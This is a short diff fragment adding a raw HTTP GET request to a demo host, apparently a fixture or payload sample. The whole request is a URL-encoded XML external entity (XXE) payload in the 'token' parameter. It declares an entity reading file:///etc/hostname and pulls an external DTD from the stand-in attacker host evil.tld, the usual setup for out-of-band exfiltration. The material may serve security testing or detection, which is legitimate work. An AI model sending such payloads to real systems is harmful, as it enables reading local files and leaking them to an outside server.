@@ -1,0 +1,4 @@
+GET /a?token=<!DOCTYPE%0adata%0a[<!ENTITY%0a%%0afile%0aSYSTEM%0a"file:///etc/hostname"><!ENTITY%0a%%0adtd%0aSYSTEM%0a"http://evil.tld/oob.dtd">%dtd;]><r/> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
